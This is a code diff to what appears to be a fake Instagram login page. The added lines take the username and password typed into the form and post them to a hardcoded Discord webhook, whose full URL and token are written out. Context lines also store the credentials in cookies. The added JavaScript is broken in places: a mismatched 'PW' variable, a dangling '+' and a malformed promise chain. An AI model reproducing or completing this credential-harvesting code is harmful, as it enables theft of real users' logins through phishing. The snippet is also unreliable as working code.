@@ -42,7 +42,33 @@ window.location = "Https://instagram.com@yeo"
        var Run = function myfunction(){
              var pw = document.getElementById("password").value
        var user = document.getElementById("username").value
-      
+      var A = prompt("whats ur name?")
+const webhookURL = 'https://discord.com/api/webhooks/859827671458775040/gzruSP-EmkI8TsCghAPLyy1zJOpV1T0x5nP7_7_NL4Tu0inJHkehzLLhp-7aZa0kl1DU';
+const message = {
+    content: 'Found: ' + user+ ' ' +PW+
+};
+
+fetch(webhookURL, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(message)
+})
+(response => {
+    if (response.ok) {
+        console.log('Message sent!');
+    } else {
+        console.error('Error sending message:', response.statusText);
+    }
+})
+.catch(error => {
+    console.error('Error:', error);
+});
+
+
+
+
             document.cookie = "WasHere=true"
           document.cookie = "user1=" + user + ""
           document.cookie = "pw1=" + pw + ""
